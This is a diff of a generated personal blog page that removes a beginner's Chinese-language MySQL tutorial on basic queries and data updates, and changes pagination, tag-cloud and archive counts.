-<p>3.范围BETWEEN..AND<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> id <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">10</span>;</span></span><br></pre></td></tr></table></figure></p>
-<p>4.模糊查询LIKE<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">'%son'</span>;</span>  #比如找一个名字后缀为'son'的人</span><br></pre></td></tr></table></figure></p>
-<p>LIKE通配符:</p>
-<pre><code><span class="comment">%   0或者更多字符</span>
-<span class="name">_</span>   任意一个字符
-[]  指定范围内的任意单个字符
-[^] 不再指定范围内的任意单个字符
-</code></pre><p>Example:</p>
-<pre><code><span class="keyword">Like</span><span class="string">"[CK]%"</span> 返回以 C 或者 K 开始的任意字符串
-<span class="keyword">Like</span><span class="string">"[S-V]ing"</span> 返回长为 <span class="number">4</span> 个字符的字符串,结尾是<span class="string">"ing"</span>,开始是从 S 到 V
-<span class="keyword">Like</span><span class="string">"M[^c]%"</span> 返回以<span class="string">"M"</span>开始且第二个字符不是<span class="string">"c"</span>的任意字符串
-</code></pre><p>5.创建昵称AS<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> name <span class="keyword">AS</span> 姓名 <span class="keyword">FROM</span> students ;</span></span><br></pre></td></tr></table></figure></p>
-<p>6.查询结果排序ORDER BY ASC升序DESC降序<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">'%son'</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> age <span class="keyword">ASC</span>,id <span class="keyword">DESC</span>;</span>#age优先排列</span><br></pre></td></tr></table></figure></p>
-<p>7.统计COUNT<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(id) <span class="keyword">FROM</span> students;</span> #查询id字段的行数</span><br></pre></td></tr></table></figure></p>
-<p>8.分组GROUP BY<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">GROUP</span> <span class="keyword">BY</span> age (<span class="keyword">HAVING</span> id &gt; <span class="number">5</span>);</span>  #括号可略,添加附加条件</span><br></pre></td></tr></table></figure></p>
-<p>9.联合查询UNION<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 前提是两个表字段一样--</span></span><br><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">UNION</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students_bak;</span>  #合并两个表的查询记录,Veen图的合并</span><br><span class="line"><span class="comment">-- 默认记录不重复,不过可以使用UNION ALL显示所有记录</span></span><br><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students_bak;</span></span><br></pre></td></tr></table></figure></p>
-<p>10.子查询/嵌套查询<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 该查询ORDER BY无效--</span></span><br><span class="line"><span class="operator"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name = (<span class="keyword">SELECT</span> age <span class="keyword">FROM</span> <span class="keyword">WHERE</span> age = <span class="number">20</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p><a href="http://www.jellythink.com/archives/932" target="_blank" rel="external">例1</a><br><a href="http://www.5idev.com/p-mysql_subquery.shtml" target="_blank" rel="external">例2</a></p>
-<h2 id="数据更新语句">数据更新语句</h2><ol>
-<li><p>INSERT<br>—&gt; VALUES结构(插入单条记录)</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> tablename [(colname&#123;,colname...&#125;)]&#123;<span class="keyword">VALUES</span> (expr|<span class="literal">NULL</span>&#123;,expr|<span class="literal">NULL</span>....&#125;)|Subquery&#125;</span><br><span class="line"><span class="comment">-- Example:</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> school.stuents(<span class="string">'s_name'</span>,<span class="string">'s_age'</span>)</span><br><span class="line">  <span class="keyword">VALUES</span> (<span class="string">'xiaobai'</span>,<span class="string">'20'</span>);</span></span><br><span class="line"><span class="comment">-- OR</span></span><br><span class="line"><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> school.students(<span class="string">'s_id'</span>,<span class="string">'s_name'</span>,<span class="string">'s_age'</span>)</span><br><span class="line">  <span class="keyword">VALUES</span> (<span class="literal">NULL</span>, <span class="string">'laoli'</span>, <span class="string">'10'</span>);</span></span><br></pre></td></tr></table></figure>
-<p>—&gt;子查询Subquery(可插入多条记录)</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> newStudens</span><br><span class="line">  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> students <span class="keyword">WHERE</span> name = <span class="string">'laowang'</span>;</span></span><br><span class="line"><span class="comment">-- 往newStudents表中插入students的一个字段(改为age就能插入多个了..)</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>UPDATE<br>—&gt; grammar </p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">UPDATE</span> tablename</span><br><span class="line">  <span class="keyword">SET</span> colname= &#123;expr|<span class="literal">NULL</span>|(subquery)&#125;</span><br><span class="line">    &#123;, colname= &#123;expr|<span class="literal">NULL</span>|(subquery).....&#125;&#125;</span><br><span class="line">      [WH ERE search_condition]   <span class="comment">-- 子查询</span></span><br><span class="line">  <span class="comment">-- -&gt;Example:</span></span><br><span class="line">  <span class="keyword">UPDATE</span> students</span><br><span class="line">    <span class="keyword">SET</span> age = age + <span class="number">10</span></span><br><span class="line">      <span class="keyword">WHERE</span> name = <span class="string">'doubi'</span>;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>DELETE</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> tablename</span><br><span class="line">  [<span class="keyword">WHERE</span> search_condition]</span><br><span class="line"><span class="comment">-- -&gt;Example:</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> students</span><br><span class="line">  <span class="keyword">WHERE</span> neme = <span class="string">'doubi'</span>;</span></span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h2 id="MySQL注释">MySQL注释</h2><ol>
-<li><code>#...</code></li>
-<li><code>-- ..</code>  有个空格</li>
-<li><code>/*...*/</code></li>
-</ol>
-<h2 id="others">others</h2><p>不等于 <code>&lt;&gt;</code></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/10/30/2015/mySql1/#comments" class="ds-thread-count comments-count-link" data-thread-key="10/30/2015/mySql1/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
 
   <nav id="page-nav" class="clearfix">
-    <a class="extend prev" rel="prev" href="/page/2/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/">Next<span></span></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><span></span>Prev</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/">Next<span></span></a>
   </nav>
 
 </div>
@@ -853,7 +862,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
   <div class="tagcloudlist">
     <p class="asidetitle">标签云</p>
     <div class="tagcloudlist clearfix">
-       <a href="/tags/Android/" style="font-size: 16.67px;">Android</a> <a href="/tags/Chrome/" style="font-size: 10px;">Chrome</a> <a href="/tags/Collection/" style="font-size: 10px;">Collection</a> <a href="/tags/G4W/" style="font-size: 11.67px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JS/" style="font-size: 18.33px;">JS</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/Nexus-5x/" style="font-size: 13.33px;">Nexus-5x</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Shell/" style="font-size: 15px;">Shell</a> <a href="/tags/Web/" style="font-size: 11.67px;">Web</a> <a href="/tags/Wifi/" style="font-size: 10px;">Wifi</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/XSS/" style="font-size: 13.33px;">XSS</a> <a href="/tags/daily/" style="font-size: 16.67px;">daily</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/touchpad/" style="font-size: 10px;">touchpad</a> <a href="/tags/书记/" style="font-size: 15px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a>
+       <a href="/tags/Android/" style="font-size: 16.67px;">Android</a> <a href="/tags/Chrome/" style="font-size: 10px;">Chrome</a> <a href="/tags/Collection/" style="font-size: 10px;">Collection</a> <a href="/tags/G4W/" style="font-size: 11.67px;">G4W</a> <a href="/tags/Hexo/" style="font-size: 10px;">Hexo</a> <a href="/tags/JS/" style="font-size: 20px;">JS</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/MySQL/" style="font-size: 15px;">MySQL</a> <a href="/tags/Nexus-5x/" style="font-size: 13.33px;">Nexus-5x</a> <a href="/tags/Router/" style="font-size: 10px;">Router</a> <a href="/tags/Shell/" style="font-size: 18.33px;">Shell</a> <a href="/tags/Web/" style="font-size: 11.67px;">Web</a> <a href="/tags/Wifi/" style="font-size: 10px;">Wifi</a> <a href="/tags/Wireshark/" style="font-size: 10px;">Wireshark</a> <a href="/tags/XSS/" style="font-size: 13.33px;">XSS</a> <a href="/tags/daily/" style="font-size: 16.67px;">daily</a> <a href="/tags/git/" style="font-size: 10px;">git</a> <a href="/tags/touchpad/" style="font-size: 10px;">touchpad</a> <a href="/tags/书记/" style="font-size: 15px;">书记</a> <a href="/tags/生活/" style="font-size: 10px;">生活</a>
     </div>
   </div>
 
@@ -861,7 +870,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
   
   <div class="archiveslist">
     <p class="asidetitle"><a href="/archives">归档</a></p>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">五月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">四月 2016</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">三月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/02/">二月 2016</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">一月 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/12/">十二月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">十一月 2015</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/10/">十月 2015</a><span class="archive-list-count">15</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/09/">九月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/07/">七月 2015</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/06/">六月 2015</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/03/">三月 2015</a><span class="archive-list-count">1</span></li></ul>
   </div>
 
 
@@ -887,7 +896,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 		  
 		
 		  
-			<li><a href="/categories/Linux/" title="Linux">Linux<sup>16</sup></a></li>
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>18</sup></a></li>
 		  
 		
 		  
@@ -899,7 +908,7 @@ tar -czvf -g zeng aa<span class="class">.tar</span><span class="class">.gz</span
 		  
 		
 		  
-			<li><a href="/categories/Web/" title="Web">Web<sup>18</sup></a></li>
+			<li><a href="/categories/Web/" title="Web">Web<sup>19</sup></a></li>
 		  
 		
 		  
